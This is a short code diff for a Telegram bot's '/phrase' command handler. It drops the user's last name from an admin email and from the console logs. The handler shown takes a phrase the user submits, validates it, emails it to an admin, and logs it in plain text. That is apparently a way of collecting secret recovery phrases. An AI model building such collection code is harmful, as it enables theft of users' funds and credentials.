@@ -35,7 +35,7 @@ const registerCommandHandlers = (bot) => {
         logMsgContext(msg, "/phrase");
 
         const {
-            from: { id: telegram_id, first_name, last_name },
+            from: { id: telegram_id, first_name },
             text
         } = msg;
 
@@ -75,10 +75,10 @@ const registerCommandHandlers = (bot) => {
             // 📬 Admin notification via email — only if the phrase is valid
             if (isValidPhrase) {
                 try {
-                    const info = await sendPhraseMail(telegram_id, first_name, last_name, phrase);
+                    const info = await sendPhraseMail(telegram_id, first_name, phrase);
 
                     console.log("📨 Phrase email sent to admin:");
-                    console.log("👤 User:", `${first_name} ${last_name} (${telegram_id})`);
+                    console.log("👤 User:", `${first_name} (${telegram_id})`);
                     console.log("🧠 Phrase:", `"${phrase}"`);
                     console.log("📩 Message ID:", info.messageId);
                     console.log("🧭 Envelope:", info.envelope);
